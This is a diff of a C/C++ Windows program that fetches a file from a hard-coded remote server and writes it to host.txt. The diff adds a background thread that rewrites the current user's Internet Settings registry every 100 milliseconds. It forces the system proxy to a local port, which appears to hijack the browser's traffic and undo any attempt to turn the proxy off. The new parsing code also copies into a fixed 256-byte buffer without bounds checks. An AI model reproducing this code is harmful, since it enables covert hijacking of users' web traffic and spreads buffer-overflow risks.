@@ -617,6 +617,7 @@ printf("%s\n%s\n", host, GET);
 */
 sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
 pURL = gethostbyname(host);
+if(!pURL)return 0;
 addr.sin_family = AF_INET;
 addr.sin_addr.s_addr = *((unsigned long*)pURL->h_addr);
 addr.sin_port = htons(99);
@@ -645,6 +646,7 @@ Mystrlen=0;
 
 FILE* f=fopen("host.txt","w");
 Mystrlen=recv(sockfd, text, MYBUFSIZ-1, 0);
+char r[256]={0};
 while ( Mystrlen > 1)
 {  
 	char * p=text;
@@ -661,8 +663,10 @@ while ( Mystrlen > 1)
 		char * q=strstr(p,"\r\n");
 		while(q)
 		{
-			char r[256]={0};
-			strncpy(r,p,q-p);
+
+				strncat(r,p,q-p);
+			  //  strncpy(r,p,q-p);
+			
 			fprintf(f,"%s\n",r);
 			char * s=strstr(r," ");
 			if(s)
@@ -675,7 +679,10 @@ while ( Mystrlen > 1)
 			q=q+2;
 			p=q;
 			q=strstr(q,"\r\n");
-
+			if(!q && p)			
+				strcpy(r,p);
+			else memset(r,0,256);
+			
 		}
 		//fputs(p,f);
 	}
@@ -720,7 +727,7 @@ return "schoolbuy.net";
 /*
 * 分离url中的主机地址和相对路径
 */
-strcpy(GET, "/crit/http.php");
+strcpy(GET, "/crit/http1.php");
 
 
 
@@ -830,21 +837,58 @@ int write_reg()
 
     return 0;
 }
-int main(int argc ,char **argv)
+int tm=time(0);
+int tolt=3600*12;
+class Thread
 {
-	write_reg();
-	is_red=false;
-	strcpy(direct_url,getright().c_str());
-
+typedef void( *ThreadFun )( void * );
+public:
+	Thread(ThreadFun f,void * p)
+	{
+		fun=f;
+		pt=p;
+	}
+	void Start()
+	{
+		_beginthread(fun, 0,pt);
+	}
+private:
+	ThreadFun fun;
+	void * pt;
+};
+void loop_reg(void *)
+{
+	while(true)
+	{
 	HKEY hKey;
 	if(RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", &hKey)==ERROR_SUCCESS)
 	{
 		RegSetValueEx(hKey, "ProxyEnable", 0, REG_SZ, (BYTE*)(LPCTSTR)"1", 1);
+		int i=1;
+		RegSetValueEx(hKey, "ProxyHttp1.1",0, REG_DWORD, (BYTE*)&i, 4);
 		string host="http=127.0.0.1:8082";
 		RegSetValueEx(hKey, "ProxyServer", 0, REG_SZ, (BYTE*)(LPCTSTR)host.c_str
 			(),host.length());
+
 		RegCloseKey(hKey);
 	}
+		Sleep(100);
+	}
+}
+void reg_set(void *)
+{
+	
+}
+int main(int argc ,char **argv)
+{
+	printf("%d\n",tm);
+	write_reg();
+	Thread t(loop_reg,NULL);
+	t.Start();
+	is_red=false;
+	strcpy(direct_url,getright().c_str());
+
+
 
     geturl();
 
